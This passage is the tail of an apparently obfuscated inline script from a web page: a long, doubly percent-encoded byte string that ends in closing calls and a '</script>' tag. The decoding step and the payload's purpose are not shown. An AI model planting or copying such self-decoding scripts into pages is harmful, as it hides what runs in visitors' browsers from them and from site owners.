05%2506%2529%2523%2502%2525%2578%252b%2560%256c%2552%257e%254d%2549%2579%2544%255a%257c%2537%250d%2573%2525%2529%252a%252f%2532%2527%2526%254b%256f%256c%2553%251b%253c%2576%2520%2562%2559%2561%256a%2566%2505%2540%2546%2579%2563%2573%256a%257b%253e%252d%2529%2517%250f%253f%253f%255b%2534%2563%2505%256f%256a%2573%2541%257f%2569%257c%2565%2561%2567%257c%2562%2560%255c%257f%2578%2569%2546%2531%253f%2539%2531%2540%2537%2521%2525%250f%253a%2528%2528%2508%253d%2519%2536%2533%2531%2576%255d%2544%254f%250c%2561%2557%256e%255b%2574%2559%252d%2525%251b%2525%256a%2525%252f%2528%2529%2573%2578%254b%2501%250a%2502%256f%2578%252a%2536%2531%252b%2567%2529%2571%2510%252e%252d%2514%252a%252c%2517%251a%253a%252d%257b%2567%252e%2526%2504%2527%253b%2528%250b%251f%2551%257f%2529%250e%252c%2525%2570%252d%253f%2530%2522%253d%2503%2553%2534%2545%253b%2555%2523%2525%2536%2560%256e%2574%2528%2572%257a%256b%251d%250c%2518%2501%2572%2538%2532%2535%2532%2536%2537%2500%2533%2520%255f%255e%2514%2522%2546%256a%2554%2573%2519%2572%2537%2550%257d%257f%2575%255e%251d%257f%253c%253a%2529%2575%252f%2535%251a%252a%254a%251c%2567%252e%2547%2532%251f%2534%2540%254d%252f%251c%250d%2543%2574%2562%250a%2527%250b%2523%256e%2535%2532%2522%2520%2513%2505%2512%2554%2535%257c%27%29%3B'));</script><!-- end -->
